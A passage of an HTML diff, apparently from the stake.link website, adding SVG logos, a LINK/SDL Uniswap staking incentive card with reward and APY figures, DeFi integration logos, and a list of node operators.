111.557 178.556 110.862 180.527C109.175 184.863 104.412 187.13 99.5503 185.849C96.2758 184.962 94.8866 184.075 90.9175 180.034C83.9716 172.938 81.2925 171.558 71.3697 170.08L69.4844 169.784L71.5682 167.813Z" fill="white">
+           </path>
+           <path clip-rule="evenodd" d="M19.3742 9.23787C42.4943 37.129 78.117 80.4933 79.9031 82.8586C81.3915 84.8297 80.7961 86.7023 78.3154 88.082C76.9262 88.8705 74.0486 89.6589 72.6594 89.6589C71.0718 89.6589 69.1865 88.8705 67.8965 87.5893C67.0035 86.7023 63.1336 81.0846 54.4016 67.5826C47.7533 57.2343 42.0974 48.66 41.9981 48.5614C41.6012 48.3643 41.6012 48.3643 53.707 69.8493C61.3475 83.3514 63.8282 88.1806 63.8282 88.7719C63.8282 90.0531 63.4313 90.743 61.8436 92.517C59.1645 95.4737 57.9738 98.8246 57.0807 105.822C56.0884 113.608 53.4093 119.127 45.7688 128.49C41.3035 134.009 40.6089 134.994 39.5174 137.261C38.1283 140.021 37.7313 141.598 37.5329 145.146C37.3344 148.891 37.7313 151.256 38.8228 154.804C39.8151 157.958 40.9066 160.027 43.5858 164.068C45.868 167.616 47.2572 170.277 47.2572 171.263C47.2572 172.051 47.4556 172.051 51.0278 171.263C59.5614 169.292 66.6066 165.941 70.4764 161.801C72.8579 159.239 73.4533 157.859 73.4533 154.311C73.4533 152.044 73.354 151.552 72.7587 150.172C71.7664 148.004 69.8811 146.23 65.8127 143.47C60.4545 139.824 58.1722 136.867 57.5769 132.925C57.0807 129.574 57.6761 127.307 60.6529 121.098C63.729 114.692 64.5228 112.031 65.0189 105.526C65.3166 101.387 65.8127 99.7116 67.0035 98.4303C68.2934 97.0506 69.3849 96.5578 72.461 96.1636C77.5216 95.4737 80.7961 94.1925 83.376 91.7286C85.6583 89.6589 86.6505 87.5893 86.7498 84.534L86.849 82.2673L85.559 80.8875C80.8953 75.5655 16.2982 5 16.0005 5C15.9013 5 17.4889 6.87255 19.3742 9.23787ZM49.8371 149.383C50.9286 147.511 50.3332 145.146 48.5471 143.963C46.8603 142.879 44.2804 143.372 44.2804 144.85C44.2804 145.244 44.4788 145.638 45.0742 145.835C45.9672 146.328 46.0665 146.821 45.3719 147.905C44.6773 148.989 44.6773 149.975 45.5703 150.665C46.9595 151.749 48.8448 151.157 49.8371 149.383Z" fill="white" fill-rule="evenodd">
+           </path>
+           <path clip-rule="evenodd" d="M90.0235 97.5436C87.642 98.2335 85.3598 100.796 84.6652 103.358C84.2683 104.935 84.4667 107.793 85.1613 108.68C86.2528 110.06 87.2451 110.454 90.0235 110.454C95.481 110.454 100.145 108.089 100.641 105.231C101.137 102.866 99.0532 99.6133 96.1756 98.135C94.6872 97.3465 91.6111 97.0509 90.0235 97.5436ZM96.374 102.471C97.1679 101.289 96.8702 100.008 95.3818 99.1205C92.7026 97.4451 88.6343 98.8249 88.6343 101.387C88.6343 102.669 90.7181 104.048 92.7026 104.048C93.9926 104.048 95.7787 103.26 96.374 102.471Z" fill="white" fill-rule="evenodd">
+           </path>
+          </g>
+          <defs>
+           <clippath id="clip0_4055_270">
+            <rect fill="white" height="191" transform="translate(16 5)" width="167">
+            </rect>
+           </clippath>
+          </defs>
+         </svg>
+         <div class="sc-ccVCaX">
+          <p class="sc-iHDLbo gBYZiF">
+           Uniswap Staking
+          </p>
+          <h3 class="sc-dSbvwS gLQBTP">
+           LINK/SDL Incentives
+          </h3>
+         </div>
+        </div>
+        <span class="sc-kGRGSO jrCrok">
+        </span>
+        <div class="sc-ccVCaX fCCknu">
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           Total Program Reward Amount
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            105,000.00 SDL
+           </p>
+          </div>
+         </section>
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           APY
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            43.61 %
+           </p>
+          </div>
+         </section>
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           Incentives Begin
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            Feb 9, 2024
+           </p>
+          </div>
+         </section>
+         <section class="sc-hKhKOZ">
+          <p class="sc-iHDLbo fpKebx">
+           Incentives Conclude
+          </p>
+          <div class="sc-ccVCaX FfXhN">
+           <p class="sc-iHDLbo ihOiNH">
+            Mar 30, 2024
+           </p>
+          </div>
+         </section>
+        </div>
+        <div class="sc-ccVCaX ijxzoq">
+         <div class="sc-ccVCaX etLYct">
+         </div>
+         <p class="sc-ksNGjt kVbspK">
+          Provide LINK and SDL liquidity, stake your LP tokens, earn trading fees and SDL liquidity mining incentives.
+         </p>
+         <div class="sc-ccVCaX dhItsT">
+          <a class="sc-jJTsDX cnrWmO">
+           Stake
+           <svg aria-hidden="true" class="sc-eePZqt iWFzTT" fill="currentColor" focusable="false" height="20" preserveaspectratio="xMidYMid meet" viewbox="0 0 32 32" width="20" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22 16L12 26 10.6 24.6 19.2 16 10.6 7.4 12 6z">
+            </path>
+           </svg>
+          </a>
+         </div>
+        </div>
+       </div>
+      </section>
+     </section>
+     <section class="sc-hKhKOZ fPTRYo">
+      <div class="sc-ccVCaX bTMSZW">
+       <h2 class="sc-emqRaN kvznzP">
+        DeFi Integrations
+       </h2>
+       <div class="sc-ccVCaX hTfaAo">
+        <a class="sc-bgqQcB" rel="noopener noreferrer">
+         <img alt="Curve.fi DeFi Integration" class="sc-fwEaKe" loading="lazy" src="/assets/curve-logo.webp" width="300px"/>
+        </a>
+        <a class="sc-bgqQcB" rel="noopener noreferrer">
+         <img alt="Dune DeFi Integration" class="sc-fwEaKe" loading="lazy" src="/assets/dune-logo.svg" width="300px"/>
+        </a>
+       </div>
+      </div>
+     </section>
+     <section class="sc-hKhKOZ bSlJqA">
+      <h2 class="sc-emqRaN hcMwjc">
+       <span class="sc-kGRGSO fQfGoo">
+        Discover the Node Operators Powering stake.link
+       </span>
+      </h2>
+      <div class="sc-ccVCaX clFbLE">
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="01NODE">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path d="M93.6213 54.6603C89.9413 52.0203 85.0613 53.7703 83.2913 58.3203C81.9513 61.7803 81.9713 65.3703 82.2613 68.9803C82.4313 71.1203 83.0013 73.1603 84.1813 74.9803C86.8213 79.0403 92.5913 79.1203 95.3013 75.1303C97.2013 72.3203 97.4013 69.1003 97.5213 65.0203C97.3913 64.0103 97.2713 62.1503 96.9113 60.3303C96.4613 58.1003 95.5513 56.0403 93.6213 54.6603Z" fill="currentColor">
+         </path>
+         <path d="M106.682 93.7499C106.682 96.4099 106.682 98.9699 106.682 101.63C108.772 101.71 110.812 102 111.942 99.8799C112.802 98.2699 112.772 96.5799 111.692 95.0499C110.412 93.2399 108.512 93.7399 106.682 93.7499Z" fill="currentColor">
+         </path>
+         <path d="M94.171 93.5902C91.961 93.5602 90.361 95.2802 90.381 97.6502C90.401 99.9402 92.031 101.66 94.151 101.64C96.281 101.62 97.881 99.9002 97.891 97.6102C97.881 95.2902 96.341 93.6202 94.171 93.5902Z" fill="currentColor">
+         </path>
+         <path d="M129.091 29.54H70.9307C61.8407 29.54 54.4707 36.91 54.4707 46V104.17C54.4707 113.26 61.8407 120.63 70.9307 120.63H129.101C138.191 120.63 145.561 113.26 145.561 104.17V46C145.551 36.91 138.181 29.54 129.091 29.54ZM85.2607 104.9H82.0407L75.6507 96.3V104.79H72.3507V90.42H75.5107L82.0307 99.19V90.51H85.2607V104.9ZM94.1107 105.07C89.6807 105.06 86.5807 101.95 86.6107 97.54C86.6407 93.19 89.7407 90.1 94.0907 90.1C98.5007 90.1 101.661 93.22 101.671 97.58C101.681 101.95 98.5207 105.08 94.1107 105.07ZM94.1607 86.34C88.9807 87.28 83.9207 86.99 79.4507 83.77C75.7807 81.12 73.8207 77.37 72.9707 73.02C71.8107 67.12 71.7807 61.24 73.9507 55.54C76.5107 48.83 81.5307 45.43 88.6607 45.12C94.2607 44.88 99.2907 46.19 103.021 50.75C105.551 53.85 106.731 57.5 107.181 61.41C107.301 62.42 107.361 63.43 107.431 64.44C107.501 65.59 107.521 66.74 107.451 67.89C107.251 71.27 106.681 74.57 105.181 77.68C102.911 82.37 99.2907 85.41 94.1607 86.34ZM111.231 104.55C108.541 105 102.951 104.9 102.951 104.9C102.951 99.91 102.951 95.3 102.951 90.41C102.951 90.41 109.851 90.31 111.521 90.84C114.501 91.78 116.331 94.47 116.251 97.81C116.161 101.18 114.271 104.04 111.231 104.55ZM127.811 104.8C124.411 104.8 121.021 104.8 117.541 104.8C117.541 100.05 117.541 95.3 117.541 90.49C120.891 90.49 124.211 90.49 127.621 90.49C127.621 91.47 127.621 92.43 127.621 93.54C125.481 93.54 123.351 93.54 121.141 93.54C121.141 94.42 121.141 95.16 121.141 96.02C122.981 96.02 124.821 96.02 126.731 96.02C126.731 97.03 126.731 97.92 126.731 98.96C124.931 98.96 123.091 98.96 121.121 98.96C121.121 99.99 121.121 100.81 121.121 101.74C123.351 101.74 125.531 101.74 127.811 101.74C127.811 102.81 127.811 103.76 127.811 104.8ZM127.841 86.66C124.511 86.66 121.201 86.66 117.751 86.66C117.751 76.89 117.751 67.13 117.751 57.15L111.081 60.16L109.431 50.79L121.191 45.11L127.841 45.1C127.841 59.01 127.841 72.79 127.841 86.66Z" fill="currentColor">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         01NODE
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="ChainLayer">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path class="sc-daSpeN jIDKfu" d="M75.1701 56.8802L100 42.5402L124.83 56.8802L142.92 46.4402L100 21.6602L57.0801 46.4402L75.1701 56.8802Z">
+         </path>
+         <path class="sc-daSpeN jIDKfu" d="M95.6309 107.45L70.8009 93.12V64.45L52.7109 54V103.56L95.6309 128.34V107.45Z">
+         </path>
+         <path class="sc-daSpeN jIDKfu" d="M129.201 64.44V93.12L104.371 107.45V128.34L147.291 103.56V54L129.201 64.44Z">
+         </path>
+         <path class="sc-daSpeN dErsZ" d="M77.8008 64.9601L100.001 77.7801L122.201 64.9601L100.001 52.1401L77.8008 64.9601Z">
+         </path>
+         <path class="sc-daSpeN joIxEL" d="M77.8008 76.2602L100.001 89.0802L122.201 76.2602L100.001 63.4502L77.8008 76.2602Z">
+         </path>
+         <path class="sc-daSpeN eFheho" d="M77.8008 87.57L100.001 100.38L122.201 87.57L100.001 74.75L77.8008 87.57Z">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         ChainLayer
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="CryptoManufaktur">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path d="M75.8301 76.9799L55.2901 94.0399C54.5501 94.6599 54.5501 95.8999 55.2901 96.6399L97.3601 131.27C98.4701 132.14 100.08 131.39 100.08 130.03V96.0199C100.08 95.7799 100.03 95.5399 99.9201 95.3299C99.8101 95.1199 99.6601 94.9299 99.4601 94.7899L77.9401 76.9799C77.6401 76.7399 77.2701 76.6099 76.8901 76.6099C76.5101 76.6099 76.1301 76.7399 75.8301 76.9799ZM100.09 54.2299V19.9699C100.09 18.6099 98.4801 17.8699 97.3701 18.7299L55.1701 53.4799C54.3001 54.2199 54.3001 55.3299 55.1701 56.0799L75.9601 73.1399C76.2601 73.3799 76.6301 73.5099 77.0101 73.5099C77.3901 73.5099 77.7601 73.3799 78.0601 73.1399L99.4701 55.4599C99.8401 55.0899 100.09 54.7199 100.09 54.2299Z" fill="currentColor">
+         </path>
+         <path d="M79.7895 76.3599L99.8395 92.9299C100.14 93.1699 100.51 93.2999 100.89 93.2999C101.27 93.2999 101.64 93.1699 101.94 92.9299L121.98 76.3599C122.72 75.7399 122.72 74.5099 121.98 73.7599L101.93 57.3099C101.63 57.0699 101.26 56.9399 100.88 56.9399C100.5 56.9399 100.13 57.0699 99.8295 57.3099L79.7895 73.7599C78.9295 74.4999 78.9295 75.7399 79.7895 76.3599Z" fill="currentColor" opacity="0.54">
+         </path>
+         <path d="M125.949 73.1399L146.739 56.0799C147.479 55.4599 147.479 54.2199 146.739 53.4799L104.419 18.7299C103.309 17.8699 101.699 18.6099 101.699 19.9699V54.2299C101.699 54.4699 101.749 54.7099 101.859 54.9199C101.969 55.1299 102.119 55.3199 102.319 55.4599L123.849 73.1399C124.149 73.3799 124.519 73.5099 124.899 73.5099C125.279 73.5199 125.649 73.3799 125.949 73.1399ZM53.0692 60.0399V90.2099C53.0692 91.5699 54.6792 92.3099 55.7892 91.4499L74.0992 76.3599C74.8392 75.7399 74.8392 74.5099 74.0992 73.7599L55.7892 58.6799C55.5392 58.4799 55.2392 58.3499 54.9192 58.3199C54.5992 58.2899 54.2792 58.3399 53.9892 58.4899C53.6992 58.6299 53.4592 58.8599 53.2992 59.1299C53.1392 59.3999 53.0492 59.7199 53.0692 60.0399ZM101.689 96.0199V130.03C101.689 131.39 103.299 132.13 104.409 131.27L146.479 96.6399C147.219 96.0199 147.219 94.7899 146.479 94.0399L125.939 76.9699C125.639 76.7299 125.269 76.5999 124.889 76.5999C124.509 76.5999 124.139 76.7299 123.839 76.9699L102.309 94.6599C101.939 95.0299 101.699 95.5299 101.689 96.0199Z" fill="currentColor">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         CryptoManufaktur
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="Framework">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path clip-rule="evenodd" d="M68 44.2223V66.8199H87.8599V44.2223H68ZM89.2681 42.917V24H132.478V42.917H89.2681ZM68 87.9008H88.0039V126.398H68V87.9008ZM89.2699 68.1955V86.5349H127.585V68.1955H89.2699Z" fill="currentColor" fill-rule="evenodd">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         Framework
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="inotel">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path d="M114.569 86.0898C106.549 86.0898 98.5294 86.0999 90.5094 86.0799C86.7394 86.0699 85.5094 84.8599 85.4994 81.1499C85.4794 77.1799 85.4794 73.2098 85.4994 69.2398C85.5194 65.4498 86.9694 64.0499 90.7894 64.0499C106.829 64.0499 122.869 64.0399 138.909 64.0499C142.969 64.0499 144.049 65.1499 144.049 69.2099C144.049 73.1099 144.049 77.0099 144.049 80.8999C144.049 84.9199 142.939 86.0599 138.839 86.0799C131.599 86.1099 124.359 86.0898 117.119 86.0898C116.269 86.0998 115.419 86.0998 114.569 86.0898Z" fill="currentColor">
+         </path>
+         <path d="M85.7503 115.21C77.3803 115.21 69.0103 115.21 60.6403 115.21C57.6803 115.21 56.3703 113.95 56.3503 110.96C56.3103 106.57 56.3103 102.18 56.3503 97.78C56.3803 94.57 57.7503 93.2701 61.1503 93.2601C72.2903 93.2401 83.4303 93.25 94.5603 93.25C99.7403 93.25 104.92 93.24 110.1 93.25C113.69 93.26 114.93 94.4701 114.95 98.1201C114.97 102.58 114.89 107.04 114.8 111.5C114.75 113.97 113.43 115.19 110.88 115.2C102.49 115.22 94.1203 115.21 85.7503 115.21Z" fill="currentColor">
+         </path>
+         <path d="M85.5198 34.7901C93.7498 34.7901 101.99 34.7801 110.22 34.7901C113.53 34.7901 114.92 36.1001 114.93 39.3901C114.94 43.9201 114.87 48.4601 114.78 52.9901C114.73 55.2201 113.68 56.3101 111.44 56.6301C110.74 56.7301 110.03 56.7501 109.32 56.7501C93.3498 56.7601 77.3798 56.7601 61.4098 56.7501C57.5498 56.7501 56.3398 55.5501 56.3298 51.6801C56.3198 47.7101 56.3198 43.7401 56.3298 39.7701C56.3398 36.0101 57.5498 34.7901 61.2498 34.7901C69.3398 34.7801 77.4298 34.7901 85.5198 34.7901Z" fill="currentColor">
+         </path>
+         <path d="M132.99 56.72C126.91 56.68 122.11 51.78 122.18 45.7C122.25 39.74 127.09 34.91 133.03 34.88C139.01 34.85 143.99 39.84 143.99 45.84C143.98 51.85 139.03 56.76 132.99 56.72Z" fill="currentColor">
+         </path>
+         <path d="M133.08 93.2803C139.12 93.3003 144.05 98.2503 143.99 104.25C143.93 110.26 138.91 115.2 132.94 115.11C126.98 115.02 122.21 110.18 122.18 104.21C122.16 98.1403 127.01 93.2703 133.08 93.2803Z" fill="currentColor">
+         </path>
+         <path d="M67.291 64.0701C73.431 64.0301 78.281 68.8401 78.261 74.9501C78.251 80.9501 73.451 85.8001 67.471 85.8401C61.421 85.8801 56.451 80.9501 56.461 74.9101C56.481 68.9301 61.291 64.1101 67.291 64.0701Z" fill="currentColor">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         inotel
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="LinkForest.io">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path d="M100.19 19.1401L51.75 47.1101V103.05L100.19 131.02L148.63 103.05V47.1101L100.19 19.1401ZM135.83 95.6501L100.2 116.22L64.56 95.6501V54.5101L100.19 33.9401L135.82 54.5101V95.6501H135.83Z" fill="currentColor">
+         </path>
+         <path d="M115.292 82.27L108.942 68.39H112.262L100.202 42.02L88.1316 68.39H91.4416L85.0916 82.27H88.8716L82.6816 95.81H117.712L111.522 82.27H115.292Z" fill="currentColor">
+         </path>
+         <path d="M103.391 96.9199H96.6113V108.14H103.391V96.9199Z" fill="currentColor">
+         </path>
+         <path d="M78.0402 88.0103H74.7402V93.4703H78.0402V88.0103Z" fill="currentColor">
+         </path>
+         <path d="M85.0207 87.47L82.0007 80.88H83.8407L80.7507 74.12H82.3607L76.4907 61.29L70.6207 74.12H72.2307L69.1407 80.88H70.9807L67.9707 87.47H85.0207Z" fill="currentColor">
+         </path>
+         <path d="M132.421 87.47L129.411 80.88H131.251L128.161 74.12H129.771L123.901 61.29L118.031 74.12H119.641L116.551 80.88H118.391L115.371 87.47H132.421Z" fill="currentColor">
+         </path>
+         <path d="M125.45 88.0103H122.15V93.4703H125.45V88.0103Z" fill="currentColor">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         LinkForest.io
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="LinkPool">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path clip-rule="evenodd" d="M159.855 49.9902H159.129H159.109C159.109 40.0809 133.62 29.0213 99.5949 29.0213V28.7743L99.5719 29.0011C65.4659 29.0011 40.0176 40.0608 40.0176 49.97C40.0176 55.7421 48.6753 61.9177 62.6204 66.055C57.6357 67.3466 53.1151 68.9006 49.1193 70.6968C37.7977 65.389 31.0371 58.1639 31.0371 49.9902C31.0371 32.8962 60.4812 20 99.5719 20L99.5949 20.2394V20C138.665 20 168.15 32.8962 168.15 49.9902H167.54L168.131 50.0106C168.131 67.1017 138.677 79.9964 99.596 80.0008L99.5719 79.5933V80.001C65.4664 80.001 40.0184 91.0603 40.0176 100.969H40.0209C40.0209 110.879 65.5096 121.938 99.5752 121.938V123.113L99.6155 121.959C133.721 121.959 159.17 110.899 159.17 100.99C159.17 95.2178 150.512 89.0421 136.567 84.9049C141.552 83.6132 146.072 82.0592 150.068 80.263L150.088 80.2832C161.39 85.6112 168.171 92.796 168.171 101.01C168.171 118.104 138.706 131 99.6155 131L99.5752 129.896V130.96C60.4845 130.96 31.0404 118.063 31 100.969H31.0371C31.0376 83.8555 60.4816 70.9797 99.5719 70.9797V71.4L99.596 70.9795C133.702 70.9795 159.15 59.9199 159.15 50.0106L159.855 49.9902Z" fill="currentColor" fill-rule="evenodd">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         LinkPool
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="LinkRiver">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path class="sc-daSpeN jIDKfu" d="M129.948 51.8003C129.948 52.6903 130.078 53.5603 130.308 54.3803L106.398 68.1903V71.0503L108.898 72.4903L132.798 58.6903C134.008 59.9203 135.548 60.8103 137.268 61.2703V84.0503C138.078 83.9003 138.908 83.8203 139.758 83.8203C140.608 83.8203 141.438 83.9103 142.248 84.0503V61.2703C146.448 60.1603 149.558 56.3503 149.558 51.8103C149.558 46.4103 145.158 42.0103 139.758 42.0103C137.038 42.0103 134.578 43.1203 132.798 44.9203L113.068 33.5303C112.498 35.1203 111.658 36.5803 110.588 37.8403L130.318 49.2303C130.078 50.0503 129.948 50.9103 129.948 51.8003ZM139.748 46.9803C142.408 46.9803 144.568 49.1403 144.568 51.8003C144.568 54.4603 142.408 56.6203 139.748 56.6203C137.088 56.6203 134.928 54.4603 134.928 51.8003C134.928 49.1403 137.088 46.9803 139.748 46.9803Z">
+         </path>
+         <path class="sc-daSpeN jIDKfu" d="M57.7692 61.2703V84.0503C58.5792 83.9003 59.4092 83.8203 60.2592 83.8203C61.1092 83.8203 61.9392 83.9103 62.7492 84.0503V61.2703C64.4692 60.8203 66.0092 59.9203 67.2192 58.6903L91.1192 72.4903L93.6192 71.0503V68.1903L69.6892 54.3803C69.9092 53.5603 70.0492 52.7003 70.0492 51.8003C70.0492 50.9103 69.9192 50.0503 69.6892 49.2203L89.4292 37.8403C88.3592 36.5803 87.5092 35.1203 86.9392 33.5303L67.2092 44.9103C65.4292 43.1203 62.9692 42.0003 60.2492 42.0003C54.8492 42.0003 50.4492 46.3903 50.4492 51.8003C50.4592 56.3403 53.5692 60.1603 57.7692 61.2703ZM60.2492 46.9803C62.9092 46.9803 65.0692 49.1403 65.0692 51.8003C65.0692 54.4603 62.9092 56.6203 60.2492 56.6203C57.5892 56.6203 55.4292 54.4603 55.4292 51.8003C55.4292 49.1403 57.5892 46.9803 60.2492 46.9803Z">
+         </path>
+         <path class="sc-daSpeN jIDKfu" d="M126.69 102.37L106.96 113.76C105.75 112.53 104.21 111.64 102.49 111.18V83.5801L99.9998 82.1401L97.5198 83.5701V111.18C95.7998 111.63 94.2598 112.53 93.0499 113.76L73.3198 102.37C72.7498 103.96 71.9098 105.42 70.8398 106.68L90.5698 118.07C90.3398 118.89 90.2098 119.76 90.2098 120.65C90.2098 126.05 94.6098 130.45 100.01 130.45C105.41 130.45 109.81 126.06 109.81 120.65C109.81 119.76 109.68 118.89 109.45 118.07L129.18 106.68C128.1 105.41 127.26 103.96 126.69 102.37ZM99.9998 125.47C97.3398 125.47 95.1798 123.31 95.1798 120.65C95.1798 117.99 97.3398 115.83 99.9998 115.83C102.66 115.83 104.82 117.99 104.82 120.65C104.82 123.31 102.66 125.47 99.9998 125.47Z">
+         </path>
+         <path class="sc-daSpeN jIDKfu" d="M139.749 87.9001C137.029 87.9001 134.569 89.0101 132.789 90.8101L104.969 74.7501L104.979 74.7401L102.479 73.3001V70.4401V38.3201C106.679 37.2101 109.789 33.4001 109.789 28.8601C109.789 23.4601 105.389 19.0601 99.9892 19.0601C94.5892 19.0601 90.1892 23.4501 90.1892 28.8601C90.1892 33.4001 93.2992 37.2201 97.4992 38.3201V70.4401V73.3001L94.9992 74.7401L95.0092 74.7501L67.2092 90.8101C65.4292 89.0201 62.9692 87.9001 60.2492 87.9001C54.8492 87.9001 50.4492 92.2901 50.4492 97.7001C50.4492 103.11 54.8492 107.5 60.2492 107.5C65.6492 107.5 70.0492 103.11 70.0492 97.7001C70.0492 96.8101 69.9192 95.9401 69.6892 95.1201L99.9892 77.6201L102.479 79.0601L130.299 95.1201C130.079 95.9401 129.939 96.8001 129.939 97.7001C129.939 103.1 134.329 107.5 139.739 107.5C145.149 107.5 149.539 103.11 149.539 97.7001C149.539 92.2901 145.149 87.9001 139.749 87.9001ZM60.2492 102.52C57.5892 102.52 55.4292 100.36 55.4292 97.7001C55.4292 95.0401 57.5892 92.8801 60.2492 92.8801C62.9092 92.8801 65.0692 95.0401 65.0692 97.7001C65.0692 100.36 62.9092 102.52 60.2492 102.52ZM95.1792 28.8501C95.1792 26.1901 97.3392 24.0301 99.9992 24.0301C102.659 24.0301 104.819 26.1901 104.819 28.8501C104.819 31.5101 102.659 33.6701 99.9992 33.6701C97.3392 33.6701 95.1792 31.5101 95.1792 28.8501ZM139.749 102.52C137.089 102.52 134.929 100.36 134.929 97.7001C134.929 95.0401 137.089 92.8801 139.749 92.8801C142.409 92.8801 144.569 95.0401 144.569 97.7001C144.569 100.36 142.409 102.52 139.749 102.52Z">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         LinkRiver
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="Matrixed.Link">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path d="M115.549 33.4399L73.9895 74.9999L91.1695 92.1799L84.4495 98.8999L60.5695 74.9999L84.4495 51.0999L88.3795 55.0299L97.2295 46.1999L84.4495 33.4399L42.9395 74.9999L84.4995 116.56L126.009 74.9999L108.829 57.8199L115.549 51.0999L139.429 74.9999L115.549 98.8799L111.289 94.6199L102.439 103.45L115.549 116.54L157.059 74.9799L115.549 33.4399ZM99.9995 66.6499L108.349 74.9799L99.9995 83.3099L91.6695 74.9799L99.9995 66.6499Z" fill="currentColor">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         Matrixed.Link
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="Orion Staking">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path d="M98.8966 20C63.3004 20.3556 45.3349 38.5627 45 74.6216L56.734 72.5359C77.0956 68.9169 93.0356 52.977 96.6546 32.6152L98.8966 20Z" fill="currentColor">
+         </path>
+         <path d="M45.0898 77.4868C47.2171 112.729 65.0878 130.567 98.7015 131L96.6538 119.477C93.0348 99.1153 77.0948 83.1748 56.7332 79.5563L45.0898 77.4868Z" fill="currentColor">
+         </path>
+         <path d="M101.625 130.996C135.942 130.444 153.425 112.678 154.073 77.6948L143.593 79.5575C123.231 83.1761 107.291 99.1165 103.672 119.478L101.625 130.996Z" fill="currentColor">
+         </path>
+         <path d="M154.091 74.4023C153.693 38.6325 136.142 20.5006 101.438 20.0068L103.679 32.6171C107.298 52.9787 123.238 68.9187 143.6 72.5377L154.091 74.4023Z" fill="currentColor">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         Orion Staking
+        </p>
+       </a>
+       <a class="sc-bgqQcB kAhLXE" rel="noopener noreferrer" title="Pier Two">
+        <svg class="sc-eePZqt iuVbfA" height="1.5em" viewbox="0 0 200 150" width="2em">
+         <path d="M89.3945 52.0143H109.966C111.548 52.0143 112.79 50.5771 112.423 49.0709C111.067 43.4189 105.872 39.2041 99.6733 39.2041C93.4748 39.2041 88.2934 43.4189 86.9238 49.0709C86.5848 50.5771 87.8131 52.0143 89.3945 52.0143Z" fill="currentColor">
+         </path>
+         <path d="M148.358 91.9604C148.358 91.8752 148.343 91.7893 148.329 91.7041V75.5018C148.329 75.5018 148.329 75.4733 148.329 75.459V65.281C148.329 60.6418 146.501 56.2736 143.207 52.9904L112.053 22.0854C105.219 15.3049 94.1104 15.3049 87.29 22.0854L56.1226 52.9904C52.8131 56.2879 51 60.6418 51 65.2668V75.4875V75.5304V91.9039C51 91.9182 51 91.9318 51 91.9461C51 92.1602 51.0432 92.3743 51.1007 92.5748C51.1151 92.6028 51.1151 92.6457 51.1295 92.6744C51.2446 93.0167 51.4317 93.331 51.6907 93.5881L68.2383 109.989L87.3044 128.904C90.5991 132.187 94.9878 134 99.6645 134C99.6645 134 99.6645 134 99.6789 134C104.356 134 108.759 132.187 112.053 128.904L131.134 109.989L147.567 93.6733C148.041 93.2594 148.358 92.6457 148.358 91.9604ZM128.501 106.036H70.8572L59.0005 94.2734H140.343L128.501 106.036ZM70.9004 77.8143H128.443L140.358 89.6339H59.0005L70.9004 77.8143ZM123.766 73.175H75.5768L85.5056 63.3254C86.7718 62.0692 88.4842 61.3555 90.283 61.3555H109.046C110.83 61.3555 112.557 62.055 113.823 63.3111L123.766 73.175ZM55.6909 65.281C55.6909 61.8836 57.0291 58.686 59.4465 56.2736L90.5991 25.3686C95.6069 20.401 103.737 20.401 108.744 25.3686L139.882 56.2736C142.3 58.6718 143.638 61.8694 143.638 65.281V73.175H134.386C131.825 73.175 129.378 72.1615 127.566 70.3772L116.141 59.0572C114.63 57.5583 112.586 56.7161 110.442 56.7161H88.8866C86.7574 56.7161 84.6997 57.5583 83.1888 59.0572L71.7781 70.3772C69.965 72.1758 67.5189 73.175 64.9576 73.175H55.6765V65.281H55.6909ZM108.744 125.621C106.312 128.019 103.104 129.346 99.6789 129.346C96.254 129.346 93.0457 128.019 90.6278 125.621L75.5481 110.675H123.824L108.744 125.621Z" fill="currentColor">
+         </path>
+        </svg>
+        <p class="sc-iHDLbo Aqwwq">
+         Pier Two
+        </p>
+       </a>
